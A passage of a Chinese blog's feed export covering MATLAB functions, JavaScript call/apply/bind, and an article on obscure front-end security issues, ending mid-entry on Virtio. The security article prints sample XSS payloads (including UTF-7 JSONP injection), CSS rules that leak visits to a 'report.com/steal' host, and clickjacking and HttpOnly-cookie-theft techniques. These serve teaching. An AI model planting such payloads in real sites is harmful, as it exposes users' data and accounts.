<li>当x&gt;0时，sign(x)=1</li></ul><p>rem(x,y)：求x除以y的馀数</p><p>gcd(x,y)：整数x和y的最大公因数</p><p>lcm(x,y)：整数x和y的最小公倍数</p><p>exp(x)：自然指数</p><p>pow2(x)：2的指数</p><p>log(x)：以e为底的对数，即自然对数或</p><p>log2(x)：以2为底的对数</p><p>log10(x)：以10为底的对数</p><h1>常用的三角函数</h1><p>sin(x)：正弦函数</p><p>cos(x)：馀弦函数</p><p>tan(x)：正切函数</p><p>asin(x)：反正弦函数</p><p>acos(x)：反馀弦函数</p><p>atan(x)：反正切函数</p><p>atan2(x,y)：四象限的反正切函数</p><p>sinh(x)：超越正弦函数</p><p>cosh(x)：超越馀弦函数</p><p>tanh(x)：超越正切函数</p><p>asinh(x)：反超越正弦函数</p><p>acosh(x)：反超越馀弦函数</p><p>atanh(x)：反超越正切函数</p><h1>向量的常用函数</h1><p>min(x): 向量x的元素的最小值</p><p>max(x): 向量x的元素的最大值</p><p>mean(x): 向量x的元素的平均值</p><p>median(x): 向量x的元素的中位数</p><p>std(x): 向量x的元素的标准差</p><p>diff(x): 向量x的相邻元素的差</p><p>sort(x): 对向量x的元素进行排序（Sorting）</p><p>length(x): 向量x的元素个数</p><p>norm(x): 向量x的欧氏（Euclidean）长度</p><p>sum(x): 向量x的元素总和</p><p>prod(x): 向量x的元素总乘积</p><p>cumsum(x): 向量x的累计元素总和</p><p>cumprod(x): 向量x的累计元素总乘积</p><p>dot(x, y): 向量x和y的内积</p><p>cross(x, y): 向量x和y的外积</p><h1>永久常数</h1><p>i或j：基本虚数单位（即）</p><p>eps：系统的浮点（Floating-point）精确度</p><p>inf：无限大， 例如1/0</p><p>nan或NaN：非数值（Not a number），例如0/0</p><p>pi：圆周率</p><p>realmax：系统所能表示的最大数值</p><p>realmin：系统所能表示的最小数值</p><p>nargin: 函数的输入引数个数</p><p>nargout: 函数的输出引数个数</p><h1>基本绘图函数</h1><p>plot: x轴和y轴均为线性刻度（Linear scale）</p><p>loglog: x轴和y轴均为对数刻度（Logarithmic scale）</p><p>semilogx: x轴为对数刻度，y轴为线性刻度</p><p>semilogy: x轴为线性刻度，y轴为对数刻度</p><h2 id="plot绘图函数的参数">plot绘图函数的参数</h2><pre><code class="language-stylus">字元 颜色 字元 图线型态 y   黄色   .     点 k   黑色   o    圆 w   白色   x     x b    蓝色  +    +  g    绿色  *     * r    红色   -   实线 c    亮青色 :   点线 m   锰紫色 -.  点虚线 --   虚线 </code></pre><h2 id="注解">注解</h2><p>xlabel(‘Input Value’); % x轴注解</p><p>ylabel(‘Function Value’); % y轴注解</p><p>title(‘Two Trigonometric Functions’); % 图形标题</p><p>legend(‘y = sin(x)’,‘y = cos(x)’); % 图形注解</p><p>grid on; % 显示格线</p><h1>二维绘图函数</h1><p>bar 长条图</p><p>errorbar 图形加上误差范围</p><p>fplot 较精确的函数图形</p><p>polar 极座标图</p><p>hist 累计图</p><p>rose 极座标累计图</p><p>stairs 阶梯图</p><p>stem 针状图</p><p>fill 实心图</p><p>feather 羽毛图</p><p>compass 罗盘图</p><p>quiver 向量场图</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/dbf56532/">http://home.meng.uno/articles/dbf56532/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      求矩阵行数/列数/维数的函数
ndims(A) 返回A的维数

size(A) 返回A各个维的最大元素个数

length(A) 返回max(size(A))

[m,n]=size(A) 如果A是二维数组，返回行数和列数

nnz(A) 返回A中非0元素的个数

取整函数
fix(x) 截尾取整

floor(x) 不超过x 的最大整数(高斯取整)

ceil(x) 大于x 的最小整数

生成随机数函数
rand(n):生成0到1之间的n阶随机数方阵

rand(m,n):生成0到1之间的m×n的随机数矩阵

其他随机数生成函数
betarnd 贝塔分布的随机数生成器

binornd 二项
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="MATLAB" scheme="http://home.meng.uno/tags/MATLAB/"/>
    
  </entry>
  
  <entry>
    <title>JS中call、apply、bind的用法</title>
    <link href="http://home.meng.uno/articles/3171f70f/"/>
    <id>http://home.meng.uno/articles/3171f70f/</id>
    <published>2016-06-07T10:45:27.000Z</published>
    <updated>2020-12-02T01:42:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天看博客时，看到了这样的一段js代码：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var bind = Function.prototype.call.bind(Function.prototype.bind);</span><br></pre>      </td>    </tr>  </table></figure><p>上面那段代码涉及到了<code>call</code>、<code>bind</code>，所以我想先区别一下<code>call</code>、<code>apply</code>、<code>bind</code>的用法。这三个方法的用法非常相似，将函数绑定到上下文中，即用来改变函数中<code>this</code>的指向。举个例子：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var zlw = &#123;</span><br><span class="line">    name: &quot;zlw&quot;,</span><br><span class="line">    sayHello: function (age) &#123;</span><br><span class="line">         console.log(&quot;hello, i am &quot;, this.name + &quot; &quot; + age &quot; years old&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var  xlj = &#123;</span><br><span class="line">    name: &quot;xlj&quot;,</span><br><span class="line">&#125;;</span><br><span class="line">zlw.sayHello(24);// hello, i am zlw 24 years old</span><br></pre>      </td>    </tr>  </table></figure><p>下面看看<code>call</code>、<code>apply</code>方法的用法：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">zlw.sayHello.call(xlj, 24);// hello, i am xlj 24 years old</span><br><span class="line">zlw.sayHello.apply(xlj, [24]);// hello, i am xlj 24 years old</span><br></pre>      </td>    </tr>  </table></figure><p>结果都相同。从写法上我们就能看出二者之间的异同。相同之处在于，第一个参数都是要绑定的上下文，后面的参数是要传递给调用该方法的函数的。不同之处在于，<code>call</code>方法传递给调用函数的参数是逐个列出的，而<code>apply</code>则是要写在数组中。</p><p>我们再来看看<code>bind</code>方法的用法：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">zlw.sayHello.bind(xlj, 24)(); //hello, i am xlj 24 years old</span><br><span class="line">zlw.sayHello.bind(xlj, [24])(); //hello, i am xlj 24 years old</span><br></pre>      </td>    </tr>  </table></figure><p><code>bind</code>方法传递给调用函数的参数可以逐个列出，也可以写在数组中。<code>bind</code>方法与<code>call</code>、<code>apply</code>最大的不同就是前者返回一个绑定上下文的函数，而后两者是直接执行了函数。由于这个原因，上面的代码也可以这样写:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">zlw.sayHello.bind(xlj)(24); //hello, i am xlj 24 years old</span><br><span class="line">zlw.sayHello.bind(xlj)([24]); //hello, i am xlj 24 years old</span><br></pre>      </td>    </tr>  </table></figure><p><code>bind</code>方法还可以这样写<code>fn.bind(obj, arg1)(arg2)</code>。</p><p>用一句话总结<code>bind</code>的用法：该方法创建一个新函数，称为绑定函数，绑定函数会以创建它时传入<code>bind</code>方法的第一个参数作为<code>this</code>，传入bind方法的第二个以及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。</p><p>现在回到开始的那段代码：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var bind = Function.prototype.call.bind(Function.prototype.bind);</span><br></pre>      </td>    </tr>  </table></figure><p>我们可以这样理解这段代码：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var bind = fn.bind(obj)</span><br></pre>      </td>    </tr>  </table></figure><p><code>fn</code>相当于<code>Function.prototype.call</code>，<code>obj</code>相当于<code>Function.prototype.bind</code>。而<code>fn.bind(obj)</code>一般可以写成这样<code>obj.fn</code>，为什么呢？因为<code>fn</code>绑定了<code>obj</code>，<code>fn</code>中的<code>this</code>就指向了<code>obj</code>。我们知道，函数中<code>this</code>的指向一般是指向调用该函数的对象。所以那段代码可以写成这样:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var bind = Function.prototype.bind.call;</span><br></pre>      </td>    </tr>  </table></figure><p>大家想一想<code>Function.prototype.call.bind(Function.prototype.bind)</code>返回的是什么？</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">console.log(Function.prototype.call.bind(Function.prototype.bind)) // call()</span><br></pre>      </td>    </tr>  </table></figure><p>返回的是<code>call</code>函数，但这个<code>call</code>函数中的上下文的指向是<code>Function.prototype.bind</code>。这个<code>call</code>函数可以这样用</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var bind = Function.prototype.call.bind(Function.prototype.bind);</span><br><span class="line">var zlw = &#123;</span><br><span class="line">    name: &quot;zlw&quot;</span><br><span class="line">&#125;;</span><br><span class="line">function hello () &#123;</span><br><span class="line">    console.log(&quot;hello, I am &quot;, this.name);</span><br><span class="line">&#125;</span><br><span class="line">bind(hello, zlw)() // hello, I am zlw</span><br></pre>      </td>    </tr>  </table></figure><p>大家可能会感到疑惑，为什么是这样写<code>bind(hello, zlw)</code>而不是这样写<code>bind(zlw, hello)</code>？既然<code>Function.prototype.call.bind(Function.prototype.bind)</code>相当于<code>Function.prototype.bind.call</code>，那么先来看下<code>Function.prototype.bind.call</code>怎么用。<code>call</code>的用法大家都知道：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Function.prototype.bind.call(obj, arg)</span><br></pre>      </td>    </tr>  </table></figure><p>其实就相当于<code>obj.bind(arg)</code>。我们需要的是<code>hello</code>函数绑定对象<code>zlw</code>，即<code>hello.bind(zlw)</code>也就是<code>Function.prototype.bind.call(hello, zlw)</code>，所以应该这样写<code>bind(hello, zlw)</code>。</p><p>现在又有一个疑问，既然<code>Function.prototype.call.bind(Function.prototype.bind)</code>相当于<code>Function.prototype.bind.call</code>，我们为什么要这么写：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var bind = Function.prototype.call.bind(Function.prototype.bind);</span><br></pre>      </td>    </tr>  </table></figure><p>而不直接这样写呢：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var bind = Function.prototype.bind.call;</span><br></pre>      </td>    </tr>  </table></figure><p>先来看一个例子：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var name = &quot;xlj&quot;;</span><br><span class="line">var zlw = &#123;</span><br><span class="line">    name: &quot;zlw&quot;</span><br><span class="line">    hello: function () &#123;</span><br><span class="line">        console.log(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">zlw.hello(); // zlw</span><br><span class="line">var hello = zlw.hello;</span><br><span class="line">hello(); // xlj</span><br></pre>      </td>    </tr>  </table></figure><p>有些人可能会意外，<code>hello()</code>的结果应该是<code>zlw</code>才对啊。其实，将<code>zlw.hello</code>赋值给变量<code>hello</code>，再调用<code>hello()</code>，<code>hello</code>函数中的<code>this</code>已经指向了<code>window</code>，与<code>zlw.hello</code>不再是同一个上下文，而全局变量<code>name</code>是<code>window</code>的一个属性，所以结果就是<code>xlj</code>。再看下面的代码：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var hello = zlw.hello.bind(zlw);</span><br><span class="line">hello(); // zlw</span><br></pre>      </td>    </tr>  </table></figure><p>结果是<code>zlw</code>，这时<code>hello</code>函数与<code>zlw.hello</code>是同一个上下文。其实上面的疑惑已经解开了，直接这样写：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var bind = Function.prototype.bind.call;</span><br></pre>      </td>    </tr>  </table></figure><p><code>bind</code>函数中的上下文已经与<code>Function.prototype.bind.call</code>中的不一样了，所以使用<code>bind</code>函数会出错。而这样写</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var bind = Function.prototype.call.bind(Function.prototype.bind);</span><br></pre>      </td>    </tr>  </table></figure><p><code>bind</code>函数中的上下文与<code>Function.prototype.call.bind(Function.prototype.bind)</code>中是一样的。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/3171f70f/">http://home.meng.uno/articles/3171f70f/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      今天看博客时，看到了这样的一段js代码：

1


var bind = Function.prototype.call.bind(Function.prototype.bind);


上面那段代码涉及到了call、bind，所以我想先区别一下call、apply、bind的用法。这三个方法的用法非常相似，将函数绑定到上下文中，即用来改变函数中this的指向。举个例子：

1
2
3
4
5
6
7
8
9
10


var zlw = {
    name: &quot;zlw&quot;,
    sayHello: function (age) {
         console.log(&quot;hello,
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="call" scheme="http://home.meng.uno/tags/call/"/>
    
      <category term="apply" scheme="http://home.meng.uno/tags/apply/"/>
    
      <category term="bind" scheme="http://home.meng.uno/tags/bind/"/>
    
  </entry>
  
  <entry>
    <title>那些前端安全冷门知识</title>
    <link href="http://home.meng.uno/articles/23b9d6e9/"/>
    <id>http://home.meng.uno/articles/23b9d6e9/</id>
    <published>2016-05-27T15:52:00.000Z</published>
    <updated>2020-12-02T02:04:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1>零、概述</h1><p>提起web前端安全，大家都会想到两个名词：<code>xss</code>和<code>csrf</code>。<br> 抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。</p><p>大概分为以下章节：</p><blockquote>  <p>盗取无法用js读写的Cookie<br> 删不掉的本地存储    <br> 函数覆写监听上报    <br> 内存Cookie与硬盘Cookie    <br> CSS带来的点击量泄露    <br> JSONP回调函数与UTF-7编码    <br> 过滤与代码混淆    <br> 心理学与社会工程学  </p></blockquote><p>资料略多，文章较长，请自备瓜子…</p><h1>一、盗取无法用js读写的Cookie</h1><p>为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">setcookie(&quot;test&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0); // 设置普通Cookie</span><br><span class="line">setcookie(&quot;test_http&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启</span><br></pre>      </td>    </tr>  </table></figure><p>我们还是可以通过一些服务器上的漏洞去获取它们。</p><h2 id="调试信息泄露">调试信息泄露</h2><p>比较经典的是PHP的phpinfo文件：</p><p><img src="http://www.meng.uno/images/safety/1.jpg" alt="phpinfo文件"></p><p>如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。<br> 访问phpinfo.php，将看到：</p><p><img src="http://www.meng.uno/images/safety/2.jpg" alt=""></p><p>其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。</p><h2 id="apache-2-2-x版本请求头超长泄露">Apache 2.2.x版本请求头超长泄露</h2><p>Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。</p><p>因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。</p><p><img src="http://www.meng.uno/images/safety/3.jpg" alt=""></p><h1>三、删不掉的本地存储</h1><p>如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且&quot;永久&quot;寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。</p><p>但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案：</p><blockquote>  <p>Cookie - 是最常见的方式，key-value 模式<br> UserData - IE自己的本地存储，key-value 模式<br> localStorage - HTML5 新增的本地存储，key-value 模式<br> local Database - HTML5 新增的浏览器本地DataBase，是SQLite 数据库<br> Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器</p></blockquote><p>除去这些，我还收集了一些比较“偏门”的存储方案：</p><blockquote>  <p>Silverlight的IsolatedStorage - 类似HTML5 localStorage<br> PNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值<br> HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容<br> Web History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）<br>    <a href="http://window.name" target="_blank" rel="noopener">window.name</a>，本质就是一个DOM 存储，并不存在本地。</p></blockquote><p>老外Samy Kamkar用半天开发了一个JavaScript API：<a href="http://en.wikipedia.org/wiki/Evercookie" target="_blank" rel="noopener">evercookie</a>。</p><p>该API利用了上面的全部存储手段，将“<code>永不丢失你的cookie</code>”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。</p><h1>四、函数覆写监听上报</h1><p>覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：<code>搞跨站的人总习惯用alert来确认是否已成功跨站</code>，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line">function log(s) &#123;</span><br><span class="line">    var img = new Image();</span><br><span class="line">    img.src = &quot;http://yousite.com/log.php?caller=&quot; + encodeURIComponent(s);</span><br><span class="line">&#125;</span><br><span class="line">var _alert = alert;</span><br><span class="line">window.alert = function(s) &#123;</span><br><span class="line">    log(alert.caller);</span><br><span class="line">    _alert(s);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…</p><p>其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：<a href="http://www.xfocus.net/articles/200712/963.html" target="_blank" rel="noopener">浅谈javascript函数劫持</a>。</p><h1>五、内存Cookie与硬盘Cookie</h1><p><code>内存Cookie</code> - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁</p><p><code>硬盘Cookie</code> - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期</p><p>我们很容易得出结论：内存Cookie更安全。因此，某些站点会把<code>敏感信息放到内存Cookie</code>里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。</p><p>因此，这里有两个关注点：</p><ol>  <li>敏感信息还是不要放Cookie里，即使是内存Cookie；</li>  <li>服务器要做Cookie的三个维度的校验 - 唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。</li></ol><h1>六、CSS带来的点击量泄露</h1><p>在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。<br> 假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。  <br> 试想这是一个  <code>导航栏组件</code>，html代码是这样的：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;a href=&quot;http://yousite.com/a1&quot; id=&quot;a1&quot;&gt;nav1&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://yousite.com/a2&quot; id=&quot;a2&quot;&gt;nav2&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://yousite.com/a3&quot; id=&quot;a3&quot;&gt;nav3&lt;/a&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>你忽略掉的css写成这样：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">#a1:visited &#123;background: url(http://report.com/steal?data=a1);&#125;</span><br><span class="line">#a2:visited &#123;background: url(http://report.com/steal?data=a2);&#125;</span><br><span class="line">#a3:visited &#123;background: url(http://report.com/steal?data=a3);&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的<code>点击数据量</code>就暴露给第三方了！</p><p>当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…</p><p>HTML5提供伪类<code>::selection</code>，当指定对象区域被选择时，就会触发。其原理跟上面类似。</p><h1>七、JSONP回调函数与UTF-7编码</h1><h2 id="基本原理">基本原理</h2><p>在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：<br>  <code>cgi-bin/get_jsonp?id=123&amp;call_back=some_function</code></p><p>返回数据格式为：<br>  <code>some_function([{'id':123, data:'some_data'}]);</code><br> 如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。</p><p>请求：<br>  <code>cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;</code></p><p>返回：<br>  <code>&lt;script&gt;alert(1);&lt;/script&gt;([{'id':123, data:'some_data'}]);</code></p><p>所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？</p><h2 id="ie解析utf-7漏洞">IE解析UTF-7漏洞</h2><p>比较简单的过滤方法，是过滤<code>&lt;&gt;</code>字符，使得无法构成html标签。但在IE6\IE7的某些版本中，存在以下漏洞：<strong>如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析</strong>（IE7后续版本已发布补丁修复）。</p><p>在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上&quot;+/v8&quot;头：<br>  <code>cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4</code></p><p>这时候巧妙的躲开了<code>&lt;&gt;</code>过滤，而返回：<br>  <code>+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=&gt;123,data=&gt;’some_data’});</code></p><p>这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。</p><h1>八、过滤与代码混淆</h1><p>过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：<a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">jsfuck</a>。</p><p>站名如其名，满满的恶意…它可以仅仅用6个字符：<code>[]()!+</code>去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句<code>alert(1)</code>编码成了3009个字符，并执行成功：</p><p><img src="http://www.meng.uno/images/safety/4.jpg" alt=""></p><p>所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。</p><h1>九、心理学与社会工程学</h1><p>有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例：</p><h2 id="诱导触发拖拽事件">诱导触发拖拽事件</h2><p>比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？</p><p>很简单，添加一张图片：</p><p><img src="http://www.meng.uno/images/safety/5.jpg" alt=""></p><p>注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。</p><h2 id="传说中的qq空间-传染病毒">传说中的QQ空间“传染病毒”</h2><p>步骤是这样的：</p><ol>  <li>A(始作俑者)发布了一条说说：<code>这个网站很好玩，快来试试吧~ http://xxx.xxx</code></li>  <li>A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面</li>  <li>好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！）</li>  <li>一传十十传百，越传越广…</li></ol><p>但真实的情况跟CSRF没一点关系。玄妙在于：<code>好友们打开链接后干了什么事情？</code></p><p>这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？<br> 用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说…</p><p>有人会问，这不是CSRF吗？还真不是。做法却很简单：</p><p>“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是<code>点击了iframe中的转发按钮</code>。真是令人万万没想到。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/23b9d6e9/">http://home.meng.uno/articles/23b9d6e9/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      零、概述
提起web前端安全，大家都会想到两个名词：xss和csrf。
抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。

大概分为以下章节：

盗取无法用js读写的Cookie
删不掉的本地存储 
函数覆写监听上报 
内存Cookie与硬盘Cookie 
CSS带来的点击量泄露 
JSONP回调函数与UTF-7编码 
过滤与代码混淆 
心理学与社会工程学 

资料略多，文章较长，请自备瓜子…

一、盗取无法用js读写的Cookie
为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="web" scheme="http://home.meng.uno/tags/web/"/>
    
      <category term="前端" scheme="http://home.meng.uno/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="冷门" scheme="http://home.meng.uno/tags/%E5%86%B7%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Virtio原理</title>
    <link href="http://home.meng.uno/articles/1ae8cec4/"/>
    <id>http://home.meng.uno/articles/1ae8cec4/</id>
    <published>2016-05-10T03:41:13.000Z</published>
    <updated>2020-12-02T01:44:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1>Virtio简介</h1><p>virtio是KVM虚拟环境下，针对I/O虚拟化的通用框架。virtio是一个半虚拟化驱动。首先说明一下全虚拟化和半虚拟化的区别。全虚拟化是指guest操作系统运行在物理机器上的hypervisor上，它不知道自己已被虚拟化，不需要任何更改就可以工作。半虚拟化指的是guest操作系统不仅知道它运行在hypervisor上，还包括让guest操作系统更高效与hyperviosr交互的代码(驱动程序)。</p><h1>QEMU模拟I/O</h1><p>如果使用QEMU模拟I/O，当guest中的设备驱动程序发起I/O操作请求时，KVM中的I/O操作捕获代码会将这次I/O请求拦截，在经过处理后将这次I/O请求的信息放在I/O共享页，然后通知QEMU程序。QEMU获得I/O操作的具体信息后，交由硬件模拟代码模拟出本次I/O操作，完成后，将结果放回I/O共享页，并通知KVM模块中的I/O操作捕获代码。最后，KVM模块中的捕获代码读取I/O共享页中的操作结果，把结果返回到客户机中。倘若guest通过DMA访问大块I/O时，QEMU不会把操作结果放在I/O共享页中，而是通过内存映射的方式将结果直接写到guest的内存中。</p><p><img src="http://www.meng.uno/images/virtio/qemu.jpg" 